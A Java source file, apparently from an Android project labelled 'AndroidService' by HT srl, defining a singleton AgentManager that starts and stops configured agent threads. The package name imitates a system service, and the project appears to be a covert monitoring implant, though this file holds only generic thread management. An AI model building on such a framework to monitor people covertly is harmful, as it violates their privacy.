/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.agent;

import java.util.HashMap;
import java.util.Iterator;

import com.android.service.Manager;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class AgentManager.
 */
public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager";

	/** The singleton. */
	private volatile static AgentManager singleton;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static AgentManager self() {
		if (singleton == null) {
			synchronized (AgentManager.class) {
				if (singleton == null) {
					singleton = new AgentManager();
					singleton.setFactory(new AgentFactory());
				}
			}
		}

		return singleton;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	public synchronized boolean startAll() {
		HashMap<AgentType, AgentConf> agents;
		agents = status.getAgentsMap();

		if (agents == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Agents map null");
			return false;
		}

		if (running == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Running Agents map null");
			return false;
		}

		final Iterator<AgentType> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final AgentType key = it.next();
			if(Cfg.DEBUG) Check.asserts(key != null, "null type");
			AgentConf conf = agents.get(key);

			if (conf.isEnabled()) {
				start(key);
			}
		}

		return true;
	}

	// Deve essere bloccante. Attende l'effettivo stop di tutto.
	/**
	 * Stop agents.
	 */
	public synchronized void stopAll() {
		HashMap<AgentType, AgentConf> agents;
		agents = status.getAgentsMap();
		final Iterator<AgentType> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final AgentType key = it.next();
			stop(key);
		}

		if(Cfg.DEBUG) Check.ensures(threads.size() == 0, "Non empty threads");
		if(Cfg.DEBUG) Check.ensures(running.size() == 0, "Non empty running");

		running.clear();
		threads.clear();
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void start(final AgentType key) {
		HashMap<AgentType, AgentConf> agents;

		agents = status.getAgentsMap();

		if (agents == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Agents map null");
			return;
		}

		if (running == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Running Agents map null");
			return;
		}

		AgentBase a = makeAgent(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.isRunning() || a.isSuspended()) {
			if(Cfg.DEBUG) Check.log( TAG + " Agent " + key + " is already running or suspended");
			return;
		}

		a = makeAgent(key);

		if(Cfg.DEBUG) Check.asserts(a != null, "null agent");
		if(Cfg.DEBUG) Check.asserts(running.get(key) != null, "null running");

		a.parse(agents.get(key));

		final Thread t = new Thread(a);
		if (Cfg.DEBUG) {
			t.setName(a.getClass().getSimpleName());
		}
		threads.put(a, t);
		t.start();
	}

	private AgentBase makeAgent(AgentType type) {
		if (running.containsKey(type) == true) {
			return running.get(type);
		}

		AgentBase base = factory.create(type);

		if (base != null) {
			running.put(type, base);
		}

		return base;
	}

	/**
	 * Stop agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void stop(final AgentType key) {
		final AgentBase a = running.get(key);
		
		if (a == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Agent " + key + " not present");
			return;
		}

		a.stopThread();
		running.remove(key);

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				// TODO Auto-generated catch block
				if(Cfg.DEBUG) { Check.log(e); }
			}
		}
		threads.remove(a);
	}
}
